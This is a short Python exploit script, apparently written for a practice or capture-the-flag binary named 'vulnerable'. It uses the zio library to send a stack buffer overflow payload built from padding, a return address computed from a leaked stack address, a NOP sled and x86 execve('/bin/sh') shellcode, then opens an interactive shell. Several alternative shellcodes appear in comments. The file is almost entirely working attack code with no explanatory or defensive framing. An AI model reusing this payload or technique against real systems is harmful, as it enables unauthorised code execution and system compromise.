#!/usr/bin/env python
# coding:utf-8

from zio import *
import binascii

# objdump -d shellcode (not working)
shellcode = "\xeb\x11\x31\xc0\xb0\xd5\x31\xdb\xcd\x80\x5b\xb0\x0b\x31\xc9\x31\xd2\xcd\x80\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
# shellcode = "\xeb\x09\x5b\xb0\x0b\x31\xc9\x31\xd2\xcd\x80\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

# shellcode on www.exploit-db.com
# shellcode = "\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"

Io = zio("./vulnerable")

# python -c 'print "A" * 8 + "BBBBCCCCDDDD" + "@@@@"' | ./vulnerable
junk = "A" * 8
fake = "BBBBCCCCDDDD"
nop = "\x90" * 16

address = l32(int(Io.readline()[2:10], 16) + len(junk) + len(fake) + 8)
payload = junk + fake + address + nop + shellcode

Io.write(payload)
Io.interact()
